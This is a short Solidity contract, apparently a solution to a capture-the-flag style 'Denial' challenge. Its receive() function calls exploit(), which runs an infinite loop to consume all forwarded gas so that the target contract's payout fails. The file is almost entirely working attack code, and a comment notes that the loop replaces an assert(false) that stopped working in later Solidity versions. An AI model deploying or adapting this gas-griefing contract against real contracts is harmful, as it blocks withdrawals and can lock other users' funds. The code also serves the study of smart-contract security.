// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    uint256 private sum;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    function exploit() public {
        // An infinite loop that will drain all the transaction gas
        while (true) {
            sum += 1;
        }
        assert(false);
    }

    receive() external payable {
        exploit(); // assert(false) used to work, but seems to have stopped working in later versions of solidity. Infinite loop needed.
    }
}
